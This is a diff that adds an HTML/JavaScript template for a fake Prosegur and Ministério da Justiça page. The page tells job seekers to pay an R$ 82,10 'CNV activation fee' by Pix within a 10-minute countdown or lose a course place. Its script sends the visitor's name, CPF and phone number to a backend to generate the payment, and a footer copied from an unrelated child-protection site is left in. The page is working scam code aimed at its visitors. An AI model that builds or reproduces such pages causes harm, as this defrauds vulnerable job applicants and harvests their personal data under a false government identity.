@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prosegur - Ativação da CNV</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+        }
+    </style>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <section class="py-10 md:py-14">
+        <div class="container mx-auto px-4 md:px-8 text-center">
+            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Ativação da CNV - Carteira Nacional de Vigilante</h2>
+            <div class="w-24 h-2 bg-[#044785] mx-auto mb-3 rounded-full"></div>
+            
+            <!-- Countdown Timer -->
+            <div class="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 max-w-md mx-auto">
+                <div class="text-center">
+                    <h3 class="text-lg font-bold text-red-800 mb-2">⏰ TEMPO LIMITE PARA PAGAMENTO</h3>
+                    <p class="text-red-700 text-sm mb-3">Você tem <strong>10 minutos</strong> para efetuar o pagamento ou perderá a vaga no curso!</p>
+                    <div id="countdown-timer" class="text-2xl font-bold text-red-600 bg-white p-3 rounded-lg">
+                        10:00
+                    </div>
+                </div>
+            </div>
+
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Para ativar sua Carteira Nacional de Vigilante (CNV) e poder ingressar no curso da Prosegur, é obrigatório o pagamento da Taxa de Expedição da CNV junto ao Ministério da Justiça e Segurança Pública. O valor é de <span class="font-bold text-red-600">R$ 82,10</span>.
+            </p>
+
+            <div class="flex flex-col items-center mb-6">
+                <!-- Payment Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded-lg p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-blue-600 font-medium text-sm">Aguardando pagamento para finalizar</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <p class="text-sm text-gray-700 mb-3" id="training-info">
+                            Após o pagamento, sua CNV será ativada automaticamente e você poderá ingressar no curso da Prosegur.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Benefícios da CNV ativada:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-sm text-gray-700">
+                            <li>Autorização para trabalhar como vigilante</li>
+                            <li>Acesso ao curso de Transporte de Valores</li>
+                            <li>Matrícula confirmada na Prosegur</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div id="qr-code-section" class="mb-8 flex flex-col items-center">
+                    <div class="flex justify-center mb-4">
+                        <img id="pix-qr-code" src="" alt="QR Code para pagamento da Taxa de Expedição da CNV" class="w-64 h-64 border-4 border-gray-300 rounded-lg shadow-lg" style="display: none;">
+                    </div>
+                    <p class="text-sm text-gray-600 mb-4 text-center max-w-md">Escaneie o QR Code acima com o app do seu banco para realizar o pagamento da taxa CNV de <strong>R$ 82,10</strong></p>
+                </div>
+            </div>
+
+            <div class="max-w-lg mx-auto" id="pix-code-section">
+                <label for="pix-code" class="block text-sm font-medium text-gray-700 mb-2">Código Pix (Copia e Cola):</label>
+                <div class="relative mb-4">
+                    <input type="text" id="pix-code" value="" readonly class="w-full px-4 py-2 border border-gray-300 rounded-lg text-sm text-gray-700">
+                </div>
+                <button onclick="copyPixCode()" class="bg-green-500 hover:bg-green-600 text-prosegur-black font-bold px-6 py-3 rounded-lg text-sm w-full shadow-lg transform hover:scale-105 transition-all duration-200 active:scale-95 border-b-4 border-green-700 hover:border-green-800">
+                    <i class="fas fa-copy mr-2"></i>Copiar Código Pix
+                </button>
+            </div>
+
+            <p class="max-w-3xl mx-auto mt-6 mb-6 md:mb-10 leading-relaxed text-sm font-bold text-red-600">
+                Atenção: Conforme a Lei nº 7.102/83, sem o pagamento da Taxa de Expedição da CNV não é permitido o ingresso no curso de Transporte de Valores. Efetue o pagamento agora!
+            </p>
+
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Após a confirmação do pagamento junto ao Ministério da Justiça e Segurança Pública, sua CNV será ativada e a matrícula no curso da Prosegur será confirmada automaticamente.
+            </p>
+
+            <a href="#" onclick="checkPaymentStatus()" class="bg-[#044785] text-white font-medium px-6 md:px-8 py-3 rounded-full inline-block">Confirmar Pagamento</a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-[#1451B4] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o Conselho Tutelar</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o Conselho Tutelar</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Proteção à Criança</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Defesa de Direitos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas de Proteção</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Orientação Familiar</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">ECA - Lei 8.069/90</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Direitos da Criança</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Direitos do Adolescente</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Medidas Protetivas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Atos Infracionais</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Políticas de Atendimento</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Processo Seletivo</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Vagas Conselheiro</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Requisitos</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <hr class="border-blue-400 mb-6">
+
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 Conselho Tutelar - Proteção da Criança e do Adolescente</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 10-minute countdown timer
+        let timeLeft = 10 * 60; // 10 minutes in seconds
+        const timerElement = document.getElementById('countdown-timer');
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+
+            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+            // Change color when time is running out
+            if (timeLeft <= 120) { // Last 2 minutes
+                timerElement.classList.add('text-red-800');
+            }
+
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent = "TEMPO ESGOTADO!";
+                timerElement.classList.add('text-red-800', 'font-bold');
+            }
+        }
+
+        // Start the timer when page loads
+        updateTimer();
+
+        function copyPixCode() {
+            const pixCodeInput = document.getElementById('pix-code');
+            pixCodeInput.select();
+            document.execCommand('copy');
+            
+            // Show feedback
+            const button = event.target;
+            const originalText = button.textContent;
+            button.textContent = 'Copiado!';
+            button.classList.add('bg-green-500');
+            
+            setTimeout(() => {
+                button.textContent = originalText;
+                button.classList.remove('bg-green-500');
+            }, 2000);
+        }
+
+        async function checkPaymentStatus() {
+            const paymentId = localStorage.getItem('cnvPaymentId');
+            
+            if (!paymentId) {
+                alert('ID do pagamento não encontrado.');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/check_cnv_payment_status/${paymentId}`);
+                const result = await response.json();
+                
+                if (result.status === 'paid') {
+                    alert('Pagamento confirmado! Redirecionando para confirmação...');
+                    window.location.href = '/resultado/aprovado';
+                } else if (result.status === 'pending') {
+                    alert('Pagamento ainda pendente. Aguarde o processamento.');
+                } else {
+                    alert('Status do pagamento: ' + result.status);
+                }
+            } catch (error) {
+                console.error('Erro ao verificar pagamento:', error);
+                alert('Erro ao verificar status do pagamento.');
+            }
+        }
+
+        // Load user data and create payment
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Get user data from multiple localStorage sources
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
+            
+            // Extract user data from different localStorage keys
+            const userName = paymentData.name || userData.full_name || userData.name || localStorage.getItem('candidateName') || '';
+            const userCPF = paymentData.cpf || userData.cpf || localStorage.getItem('candidateCPF') || '';
+            const userPhone = paymentData.phone || userData.phone || localStorage.getItem('candidatePhone') || '';
+            
+            console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone });
+            
+            if (userName && userCPF && userPhone) {
+                try {
+                    // Prepare payment data for API (backend expects 'nome' not 'name')
+                    const finalPaymentData = {
+                        nome: userName,
+                        cpf: userCPF,
+                        phone: userPhone,
+                        amount: 82.10,
+                        description: 'Taxa de Expedição da CNV - Ministério da Justiça'
+                    };
+                    
+                    // Create PIX payment with real API
+                    const response = await fetch('/create_cnv_payment', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(finalPaymentData)
+                    });
+                    
+                    const result = await response.json();
+                    
+                    console.log('API Response:', result);
+                    
+                    if (result.success && result.payment_data) {
+                        const pixData = result.payment_data;
+                        console.log('PIX Data:', pixData);
+                        
+                        // Display real PIX code
+                        if (pixData.pixCopyPaste) {
+                            document.getElementById('pix-code').value = pixData.pixCopyPaste;
+                            console.log('PIX code set successfully');
+                        }
+                        
+                        // Display real QR Code
+                        if (pixData.pixQrCode) {
+                            const qrCodeElement = document.getElementById('pix-qr-code');
+                            qrCodeElement.src = pixData.pixQrCode;
+                            qrCodeElement.style.display = 'block';
+                            console.log('QR Code displayed successfully');
+                        }
+                        
+                        // Store payment ID for status checking
+                        if (pixData.paymentId) {
+                            localStorage.setItem('cnvPaymentId', pixData.paymentId);
+                            console.log('Payment ID stored:', pixData.paymentId);
+                        }
+                        
+                        // Hide loading message and show success
+                        const statusElement = document.querySelector('.text-blue-600');
+                        if (statusElement) {
+                            statusElement.textContent = 'PIX gerado com sucesso! Efetue o pagamento.';
+                            statusElement.className = 'text-green-600 font-medium text-sm';
+                        }
+                        
+                    } else {
+                        throw new Error(result.error || 'Erro ao criar pagamento PIX');
+                    }
+                } catch (error) {
+                    console.error('Erro ao criar pagamento:', error);
+                    alert('Erro ao carregar dados de pagamento. Tente novamente.');
+                }
+            } else {
+                console.error('Dados do usuário incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
+                alert('Dados do usuário não encontrados. Retorne à página anterior e preencha o formulário.');
+                window.location.href = '/aviso';
+            }
+        });
+    </script>
+</body>
+</html>
